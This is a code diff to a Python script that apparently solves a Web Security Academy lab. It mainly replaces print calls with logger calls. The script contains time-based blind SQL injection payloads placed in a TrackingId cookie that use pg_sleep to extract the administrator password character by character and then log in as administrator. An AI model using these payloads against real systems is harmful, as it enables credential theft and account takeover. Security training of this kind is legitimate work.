@@ -1,4 +1,5 @@
-from web_security_academy.core.utils import *
+from web_security_academy.core.utils import print_info_secondary, print_success
+from web_security_academy.core.logger import logger
 from bs4 import BeautifulSoup
 
 import string
@@ -6,10 +7,10 @@ import time
 
 
 def solve_lab(session):
-    print_info(
+    logger.info(
         f'Determining the length of the administrator password by visiting "/" with the following cookies:'
     )
-    print(
+    logger.info(
         '{"TrackingId": "\' || CASE WHEN (LENGTH((SELECT password FROM users WHERE username=\'administrator\'))=\033[1;93m?\033[00m) THEN pg_sleep(10) ELSE pg_sleep(0) END --"}'
     )
 
@@ -28,13 +29,13 @@ def solve_lab(session):
             print_info_secondary(f"{len_pass} => {response_time:.2f} seconds", end="")
             len_pass += 1
         else:
-            print_success(f"{len_pass} => {response_time:.2f} seconds\n")
+            print_success(f"{len_pass} => {response_time:.2f} seconds")
             break
 
-    print_info(
-        f'Determining administrator password by visting "/" with the following cookies:'
+    logger.info(
+        f'Determining administrator password by visiting "/" with the following cookies:'
     )
-    print(
+    logger.info(
         '{"TrackingId": "\' || CASE WHEN (SUBSTR((SELECT password FROM users WHERE username=\'administrator\'), \033[1;93m?\033[00m, 1)=\033[1;93m?\033[00m) THEN pg_sleep(10) ELSE pg_sleep(0) END --"}'
     )
     alphabet = string.ascii_letters + string.digits + string.punctuation
@@ -64,9 +65,10 @@ def solve_lab(session):
                 break
         else:
             print()
-            print_fail(f"Unable to determine character at index {i}")
+            logger.failure(f"Unable to determine character at index {i}")
+            return
 
     print()
-    print_success(f"Successfully extracted administrator password: {password}\n")
+    logger.info(f"Successfully extracted administrator password: {password}")
 
     session.login("administrator", password)
